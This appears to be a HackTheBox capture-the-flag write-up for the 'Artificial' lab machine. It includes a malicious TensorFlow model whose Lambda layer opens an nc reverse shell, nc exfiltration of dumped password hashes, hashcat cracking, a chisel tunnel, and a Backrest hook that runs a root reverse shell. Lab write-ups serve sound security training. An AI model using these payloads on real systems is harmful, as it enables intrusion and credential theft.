---
icon: brain-circuit
---

# HTB-ARTIFICIAL(S8)

<figure><img src="../../../../.gitbook/assets/image (505).png" alt=""><figcaption></figcaption></figure>

### Reconnaissance

#### Port Scanning with Nmap

First, I performed a comprehensive port scan to identify open services on the target machine.

```bash
nmap -sC -sV -oA nmap/artificial 10.10.11.74
```

**Output:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key Findings:**

* **Port 22 (SSH):** OpenSSH 8.2p1 - Standard SSH service
* **Port 80 (HTTP):** nginx 1.18.0 with redirect to `artificial.htb`

#### Adding Domain to /etc/hosts

The nmap scan revealed a redirect to `artificial.htb`, so I added this to my hosts file.

```bash
echo "10.10.11.74 artificial.htb" | sudo tee -a /etc/hosts
```

**Verification:**

```bash
cat /etc/hosts | grep artificial
```

**Output:**

```
10.10.11.74 artificial.htb
```

***

### Initial Access - Web Application Enumeration

#### Browsing the Web Application

I navigated to `http://artificial.htb` in my browser.

<figure><img src="../../../../.gitbook/assets/image (503).png" alt=""><figcaption></figcaption></figure>

**What I Found:**

* A landing page promoting an AI model deployment platform
* Tagline: "Revolutionize Your AI Experience"
* Features: Build, test, and deploy AI models
* Registration and login functionality

#### Registering an Account

I created a new account to access the application's features.

**Registration Details:**

* **Username:** sn0x
* **Email:** sn0x@sn0x.com
* **Password:** sn0x123

**Steps:**

1. Clicked "Register" on the homepage
2. Filled in the registration form
3. Submitted and received confirmation
4. Logged in with the new credentials

#### Dashboard Analysis

After logging in, I was presented with a dashboard containing:

**1. File Upload Section - "YOUR MODELS"**

* Upload functionality for AI models
* Accepts `.h5` files (TensorFlow/Keras format)
* Options to view predictions and delete models

**2. Two Important Links:**

**Link 1: requirements.txt**

```bash
curl http://artificial.htb/requirements.txt
```

**Output:**

```
tensorflow-cpu==2.13.1
numpy==1.24.3
flask==2.3.2
```

**Link 2: Dockerfile**

```bash
curl http://artificial.htb/Dockerfile
```

**Output:**

```dockerfile
FROM python:3.8-slim
 
WORKDIR /code
 
RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*
 
RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl
 
ENTRYPOINT ["/bin/bash"]
```

**Key Observations:**

* Application uses TensorFlow CPU version 2.13.1
* Python 3.8 environment
* Models are executed in a Docker container

***

### Exploitation - TensorFlow RCE

#### Vulnerability Research

I searched for vulnerabilities in TensorFlow 2.13.1 and discovered a Remote Code Execution (RCE) vulnerability through malicious model files.

**Reference:** [TensorFlow Remote Code Execution with Malicious Model](https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model)

**Vulnerability Details:**

* TensorFlow's `Lambda` layer can execute arbitrary Python code
* When a model is loaded and predictions are made, the Lambda function executes
* This allows embedding OS commands in the model file

#### Setting Up Local Environment

To create a compatible malicious model, I set up a Python 3.8 environment with TensorFlow 2.13.1.

```bash
# Create virtual environment with Python 3.8
uv venv --python 3.8

# Activate the environment
source .venv/bin/activate

# Install TensorFlow CPU 2.13.1
uv pip install "tensorflow-cpu==2.13.1"
```

**Verification:**

```bash
python --version
```

**Output:**

```
Python 3.8.10
```

```bash
pip list | grep tensorflow
```

**Output:**

```
tensorflow-cpu       2.13.1
```

#### Creating the Malicious Model

I created a Python script to generate a malicious TensorFlow model that would establish a reverse shell.

**File: exploit.py**

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 4444 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

**Explanation of the Payload:**

1. `rm -f /tmp/f` - Remove any existing named pipe
2. `mknod /tmp/f p` - Create a named pipe at /tmp/f
3. `cat /tmp/f|/bin/sh -i 2>&1` - Read from pipe and execute shell commands
4. `nc 10.10.14.15 4444 >/tmp/f` - Connect to attacker's listener and redirect output to pipe

**Note:** Replace `10.10.14.15` with your VPN IP address.

**Getting Your VPN IP:**

```bash
ip a show tun0 | grep inet | awk '{print $2}' | cut -d'/' -f1
```

#### Generating the Malicious Model

```bash
python exploit.py
```

**Output:**

```
2024/01/15 10:30:45 WARNING:tensorflow:Compiled the loaded model, but the compiled metrics have yet to be built. `model.compile_metrics` will be empty until you train or evaluate the model.
```

**Verification:**

```bash
ls -lh exploit.h5
```

**Output:**

```
-rw-r--r-- 1 kali kali 5.2K Jan 15 10:30 exploit.h5
```

#### Setting Up Netcat Listener

Before uploading the model, I set up a listener to catch the reverse shell.

```bash
nc -nlvp 4444
```

**Output:**

```
listening on [any] 4444 ...
```

#### Uploading the Malicious Model

**Steps:**

1. Navigated to the dashboard at `http://artificial.htb/dashboard`
2. Clicked "Choose File" under "YOUR MODELS"
3. Selected `exploit.h5`
4. Clicked "Upload Model"

**Response:**

```
Model uploaded successfully!
```

#### Triggering the Exploit

After upload, the dashboard showed:

* Model name: exploit.h5
* Upload date/time
* Two buttons: "View Predictions" and "Delete"

**Triggering Execution:**

1. Clicked "View Predictions"
2. The page attempted to load predictions

**Netcat Listener Output:**

```
listening on [any] 4444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.74] 48878
/bin/sh: 0: can't access tty; job control turned off
$ 
```

🎉 **Success! We have a reverse shell!**

#### Stabilizing the Shell

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
app@artificial:/app$ export TERM=xterm
app@artificial:/app$ ^Z
[1]+  Stopped                 nc -nlvp 4444

┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg
nc -nlvp 4444

app@artificial:/app$ 
```

#### Initial Enumeration as 'app' User

```bash
whoami
```

**Output:**

```
app
```

```bash
id
```

**Output:**

```
uid=1001(app) gid=1001(app) groups=1001(app)
```

```bash
pwd
```

**Output:**

```
/app
```

```bash
ls -la
```

**Output:**

```
total 48
drwxrwxr-x 7 app  app  4096 Jun 21 20:00 .
drwxr-xr-x 4 root root 4096 Jun 20 15:30 ..
-rw-r--r-- 1 app  app  2341 Jun 20 15:30 app.py
drwxr-xr-x 2 app  app  4096 Jun 21 20:59 instance
drwxr-xr-x 2 app  app  4096 Jun 20 15:30 models
-rw-r--r-- 1 app  app   156 Jun 20 15:30 requirements.txt
drwxr-xr-x 2 app  app  4096 Jun 20 15:30 static
drwxr-xr-x 2 app  app  4096 Jun 20 15:30 templates
drwxr-xr-x 2 app  app  4096 Jun 21 20:59 uploads
```

***

### Post-Exploitation - Database Extraction

#### Locating the Database

The application must store user credentials somewhere. I searched for database files.

```bash
find /app -name "*.db" 2>/dev/null
```

**Output:**

```
/app/instance/users.db
```

#### Examining the Database Structure

```bash
cd /app/instance
ls -la
```

**Output:**

```
total 32
drwxr-xr-x 2 app app  4096 Jun 21 20:59 .
drwxrwxr-x 7 app app  4096 Jun 21 20:00 ..
-rw-r--r-- 1 app app 24576 Jun 21 20:59 users.db
```

```bash
sqlite3 users.db
```

**SQLite Prompt:**

```
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> 
```

#### Querying Database Tables

```sql
.tables
```

**Output:**

```
model  user
```

```sql
.schema user
```

**Output:**

```sql
CREATE TABLE user (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    email TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL
);
```

#### Extracting User Credentials

```sql
SELECT * FROM user;
```

**Output:**

```
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|sn0x|sn0x@artificial.htb|a0f6d1ed43eedd9e4c68c435b1124b24
```

```sql
.quit
```

#### Analyzing the Application Code

To understand the hash format, I examined the application code.

```bash
cat /app/app.py | grep -A 5 "password"
```

**Relevant Output:**

```python
import hashlib

def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()
```

**Finding:** Passwords are hashed using MD5 (insecure!)

#### Saving Hashes for Cracking

```bash
cd /tmp
cat > hashes.txt << EOF
gael:c99175974b6e192936d97224638a34f8
mark:0f3d8c76530022670f1c6029eed09ccb
robert:b606c5f5136170f15444251665638b36
royer:bc25b1f80f544c0ab451c02a3dca9fc6
mary:bf041041e57f1aff3be7ea1abd6129d0
sn0x:a0f6d1ed43eedd9e4c68c435b1124b24
EOF
```

#### Transferring Hashes to Attacking Machine

**On attacking machine:**

```bash
nc -nlvp 5555 > hashes.txt
```

**On target machine:**

```bash
nc 10.10.14.15 5555 < /tmp/hashes.txt
```

#### Cracking MD5 Hashes

Back on the attacking machine:

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --username
```

**Output:**

```
hashcat (v6.2.6) starting...

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]

* Device #1: pthread-AMD Ryzen 7 5800X 8-Core Processor, 2738/5540 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 6 digests; 6 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

...

c99175974b6e192936d97224638a34f8:mattp005numbertwo
bc25b1f80f544c0ab451c02a3dca9fc6:pinkpanther

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: hashes.txt
Time.Started.....: Mon Jan 15 11:05:23 2024
Time.Estimated...: Mon Jan 15 11:05:45 2024 (22 secs)
```

**Cracked Credentials:**

* **gael:** mattp005numbertwo
* **royer:** pinkpanther

***

### Lateral Movement - User gael

#### Checking Local Users

Back on the target machine:

```bash
cat /etc/passwd | grep -E '/bin/bash|/bin/sh' | grep -v root
```

**Output:**

```
gael:x:1000:1000:Gael:/home/gael:/bin/bash
app:x:1001:1001::/home/app:/bin/bash
```

**Finding:** User `gael` has a home directory and bash shell - likely a legitimate user account.

#### SSH Access as gael

From attacking machine:

```bash
ssh gael@10.10.11.74
```

**Prompt:**

```
gael@10.10.11.74's password: 
```

**Enter:** `mattp005numbertwo`

**Output:**

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-200-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Mon Jun 21 18:42:15 2024 from 10.10.14.8
gael@artificial:~$ 
```

**Successfully logged in as gael!**

#### Capturing User Flag

```bash
ls -la
```

**Output:**

```
total 32
drwxr-x--- 4 gael gael 4096 Jun 21 20:15 .
drwxr-xr-x 4 root root 4096 Jun 20 15:30 ..
lrwxrwxrwx 1 root root    9 Jun 20 16:45 .bash_history -> /dev/null
-rw-r--r-- 1 gael gael  220 Jun 20 15:30 .bash_logout
-rw-r--r-- 1 gael gael 3771 Jun 20 15:30 .bashrc
drwx------ 2 gael gael 4096 Jun 20 15:32 .cache
-rw-r--r-- 1 gael gael  807 Jun 20 15:30 .profile
drwx------ 2 gael gael 4096 Jun 20 15:32 .ssh
-rw-r----- 1 root gael   33 Jun 21 17:00 user.txt
```

```bash
cat user.txt
```

**Output:**

```
a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
```

**User flag captured!**

#### Privilege Enumeration

```bash
id
```

**Output:**

```
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
```

**Key Finding:** User `gael` is member of `sysadm` group (non-standard group!)

```bash
sudo -l
```

**Output:**

```
[sudo] password for gael: 
Sorry, user gael may not run sudo on artificial.
```

**Finding:** No sudo privileges

#### Searching for sysadm Group Files

```bash
find / -group sysadm 2>/dev/null
```

**Output:**

```
/var/backups/backrest_backup.tar.gz
```

**Important Discovery:** A backup file owned by the `sysadm` group!

```bash
ls -la /var/backups/backrest_backup.tar.gz
```

**Output:**

```
-rw-r----- 1 root sysadm 125847 Jun 20 16:30 /var/backups/backrest_backup.tar.gz
```

***

### Privilege Escalation - Root Access via Backrest

#### Extracting the Backup Archive

```bash
cp /var/backups/backrest_backup.tar.gz /dev/shm/
cd /dev/shm
tar -xzf backrest_backup.tar.gz
```

**Output:**

```
backrest/
backrest/restic
backrest/oplog.sqlite-wal
backrest/oplog.sqlite-shm
backrest/.config/
backrest/.config/backrest/
backrest/.config/backrest/config.json
backrest/oplog.sqlite.lock
backrest/backrest
backrest/tasklogs/
backrest/tasklogs/logs.sqlite-shm
backrest/tasklogs/.inprogress/
backrest/tasklogs/logs.sqlite-wal
backrest/tasklogs/logs.sqlite
backrest/oplog.sqlite
backrest/jwt-secret
backrest/processlogs/
backrest/processlogs/backrest.log
backrest/install.sh
```

```bash
ls -la backrest/
```

**Output:**

```
total 28828
drwxr-xr-x 6 gael gael     4096 Jun 20 16:28 .
drwxrwxrwt 3 root root      100 Jun 21 21:15 ..
-rwxr-xr-x 1 gael gael 14643200 Jun 20 16:28 backrest
drwxr-xr-x 3 gael gael     4096 Jun 20 16:28 .config
-rw-r--r-- 1 gael gael      249 Jun 20 16:28 install.sh
-rw-r--r-- 1 gael gael       64 Jun 20 16:28 jwt-secret
-rw-r--r-- 1 gael gael    20480 Jun 20 16:28 oplog.sqlite
-rw-r--r-- 1 gael gael        0 Jun 20 16:28 oplog.sqlite.lock
-rw-r--r-- 1 gael gael    32768 Jun 20 16:28 oplog.sqlite-shm
-rw-r--r-- 1 gael gael   103656 Jun 20 16:28 oplog.sqlite-wal
drwxr-xr-x 2 gael gael     4096 Jun 20 16:28 processlogs
-rwxr-xr-x 1 gael gael 14682112 Jun 20 16:28 restic
drwxr-xr-x 3 gael gael     4096 Jun 20 16:28 tasklogs
```

#### Analyzing Backrest Configuration

```bash
cat backrest/.config/backrest/config.json
```

**Output:**

```json
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

**Key Findings:**

* Username: `backrest_root`
* Password is base64-encoded bcrypt hash

#### Decoding the Password Hash

```bash
echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP' | base64 -d
```

**Output:**

```
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
```

```bash
echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP' | base64 -d > backrest_hash.txt
```

#### Cracking the Bcrypt Hash

**Transfer to attacking machine and crack:**

```bash
hashcat -m 3200 '$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO' /usr/share/wordlists/rockyou.txt
```

**Output:**

```
hashcat (v6.2.6) starting...

* Device #1: pthread-AMD Ryzen 7 5800X 8-Core Processor, 2738/5540 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

...

$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP5...Zz/0QO
Time.Started.....: Mon Jan 15 12:30:22 2024
Time.Estimated...: Mon Jan 15 12:38:15 2024 (7 mins, 53 secs)
```

**Cracked Password:** `!@#$%^`

#### Finding Backrest Service

```bash
ss -tlnp | grep backrest
```

**Output:**

```
LISTEN 0      4096       127.0.0.1:9898      0.0.0.0:*
```

**Finding:** Backrest is running on localhost port 9898

#### Setting Up Port Forwarding with Chisel

Since Backrest is only accessible on localhost, I need to forward the port to my attacking machine.

**On attacking machine:**

```bash
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64
mv chisel_1.9.1_linux_amd64 chisel
./chisel server --port 8000 --reverse
```

**Output:**

```
2024/01/15 12:45:00 server: Reverse tunnelling enabled
2024/01/15 12:45:00 server: Fingerprint xYz123...
2024/01/15 12:45:00 server: Listening on http://0.0.0.0:8000
```

**Transfer Chisel to target:**

On attacking machine:

```bash
python3 -m http.server 8080
```

On target machine:

```bash
cd /tmp
wget http://10.10.14.15:8080/chisel
chmod +x chisel
```

**Establish reverse tunnel:**

```bash
./chisel client 10.10.14.15:8000 R:9898:127.0.0.1:9898
```

**Output on target:**

```
2024/01/15 18:45:30 client: Connecting to ws://10.10.14.15:8000
2024/01/15 18:45:30 client: Connected (Latency 45ms)
```

**Output on attacking machine:**

```
2024/01/15 12:45:30 server: session#1: tun: proxy#R:9898=>127.0.0.1:9898: Listening
```

#### Accessing Backrest Web Interface

Open browser and navigate to: `http://127.0.0.1:9898`

**Login page appears with:**

* Username field
* Password field

**Credentials:**

* Username: `backrest_root`
* Password: `!@#$%^`

**Successfully logged into Backrest!**

#### Understanding Backrest

Backrest is a web UI for restic (backup tool). Key features:

* Create repositories
* Create backup plans
* Schedule backups
* Execute commands via hooks

#### Creating a Malicious Repository

**Steps:**

1. Click "Add Repository"
2. **Repository Name:** evil\_repo
3. **Repository URL:** /tmp
4. **Password:** Generate random password: `test123`
5. Click "Create"

**Output:**

```
Repository created successfully
```

#### Creating a Malicious Backup Plan with Hook

**Steps:**

1. Click "Add Plan"
2. **Plan Name:** evil\_plan
3. **Repository:** Select "evil\_repo"
4. **Paths to backup:** /tmp
5. Click on "Hooks" tab
6. Click "Add Hook"

**Hook Configuration:**

* **Condition:** CONDITION\_SNAPSHOT\_START (executes before backup)
* **Command:**

```bash
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 5444 >/tmp/f
```

7. Click "Save Hook"
8. Click "Save Plan"

**Output:**

```
Plan created successfully
```

#### Setting Up Root Shell Listener

On attacking machine:

```bash
nc -nlvp 5444
```

**Output:**

```
listening on [any] 5444 ...
```

#### Triggering the Hook

**Steps:**

1. Click on "evil\_plan" in the sidebar
2. Click "Backup Now"

**Listener Output:**

```
listening on [any] 5444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.74] 54718
bash: cannot set terminal process group (41760): Inappropriate ioctl for device
bash: no job control in this shell
root@artificial:/# Root shell obtained!
```

#### Stabilizing Root Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

#### Verifying Root Access

```bash
whoami
```

**Output:**

```
root
```

```bash
id
```

**Output:**

```
uid=0(root) --- 
```

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
